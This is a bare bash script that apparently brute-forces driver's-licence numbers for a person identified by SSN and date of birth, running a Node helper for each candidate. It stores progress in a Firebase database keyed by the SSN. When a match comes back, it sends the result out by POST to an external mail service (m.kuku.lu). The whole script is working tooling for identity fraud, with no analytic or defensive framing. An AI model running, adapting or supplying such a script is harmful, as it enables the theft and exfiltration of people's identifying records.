#!/bin/bash

prefix=${dlId:0:-6}

for (( c=1; c<=${count:-10000}; c++ ))
do
  if [[ "${dlId}" == *000 ]]; then
    lastId=$(curl -s https://sndl-d6b5d-default-rtdb.firebaseio.com/${ssn}/${prefix}/${dlId}.json)
    if [[ $lastId -ne 0 ]]; then
      echo "SKIP: ${dlId}..${lastId}"
      count=$((count-lastId+dlId))
      dlId=$((lastId+1))
      continue
    fi
  fi
  
  output=$(node index ${dlId} ${dob} ${ssn})
  echo $output | grep Success && result=$output && break
  echo $output
  
  if [[ "${dlId}" == *999 ]]; then
    echo "${dlId:0:-3}000" >> $markfile
    curl -s -X PUT -d "${dlId}" https://sndl-d6b5d-default-rtdb.firebaseio.com/${ssn}/${prefix}/${dlId:0:-3}000.json
  fi
  
  dlId=$((dlId+1))
done

if [ ! -z "$result" ]; then
  curl -s -X POST "https://m.kuku.lu/f.php" -H "Accept-Language: en-US,en;q=0.9" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "h=3690c0ddc9" --data-urlencode "action=sendMail" --data-urlencode "data=$result"
  exit 1
fi
